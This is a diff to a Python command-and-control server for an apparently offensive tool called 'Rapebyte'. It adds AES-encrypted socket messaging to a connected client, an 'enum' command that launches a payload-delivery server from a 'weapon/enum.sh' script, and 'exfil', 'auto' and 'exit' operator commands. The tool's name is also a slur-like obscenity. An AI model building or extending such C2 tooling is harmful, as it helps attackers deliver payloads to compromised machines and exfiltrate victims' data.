@@ -64,9 +64,18 @@ print(log)
 print("[*] Loading First Encryption Key\n")
 print(commands)
 
+def recv_send_data(metadata='error'):
+    usr = metadata.encode()
+    usr_send = magic.encrypt(usr)
+    conn.send(usr_send)
+    In_messg = conn.recv(8192)
+    recv_data_enc = magic.decrypt(In_messg)
+    global recv_data_dec
+    recv_data_dec = recv_data_enc.decode()
 
 def delv_enum():
-    os.system("")
+    os.system("cd weapon/; ./enum.sh  > /dev/null")
+    print(colored("[+] Quitting Enum--Payload--Server Now", "green", attrs=['bold']))
 
 def svr():
     global s
@@ -86,17 +95,8 @@ def key_gen():
 
 def start_encryption(key):
     global magic
-    magic = AES.new(f'{enc_key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!
-
-
-def recv_send_data(metadata='error'):
-    usr = metadata.encode()
-    usr_send = magic.encrypt(usr)
-    conn.send(usr_send)
-    In_messg = conn.recv(8192)
-    recv_data_enc = magic.decrypt(In_messg)
-    global recv_data_dec
-    recv_data_dec = recv_data_enc.decode()
+    magic = AES.new(f'{key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!
+    print("\n" + key + "\n")
 
 def run():
     print(colored("[*] FiringUp Rapebyte Now..."))
@@ -105,15 +105,24 @@ def run():
         if usr == 'run':
             recv_send_data(usr)
         elif usr == 'enum':
-            os.system("echo 'Enumeration Selected By $HOSTNAME:::::[$(date)]' >> rbyte.log ")
-            print(colored("[+] Switching To Second Stage Encryption Key", 'red', attrs=['bold']))
-            start_encryption(keys.get('enc0'))
+            os.system("echo Enumeration Selected By $HOSTNAME:::::[$(date)] >> rbyte.log ")
             recv_send_data(usr)
+            print(colored("[+] Switching To Second Stage Encryption Key::10sec-sleep", 'red', attrs=['bold']))
+            time.sleep(10)
+            start_encryption(keys.get('enc0'))
             print("[+] Starting Server For Delivering Enumeration Payload:::Runtime set to 60sec")
+            print(colored("[!] Keep your Hands off the Keyword", 'red', attrs=['bold']))
+            delv_enum()
         elif usr == 'exfil':
             recv_send_data(usr)
         elif usr == 'auto':
             recv_send_data(usr)
+        elif usr  == 'exit':
+            recv_send_data(usr)
+            time.sleep(5)
+            print(colored("[*] Bye See You Later"))
+            os.system("echo User Exiting RapeByte:::::[$(date)] >> rbyte.log")
+            sys.exit()
         elif len(usr) == 0:
             recv_send_data()
         else:
@@ -131,4 +140,3 @@ while True:
         key_gen()
         start_encryption(enc_key)
         run()
-
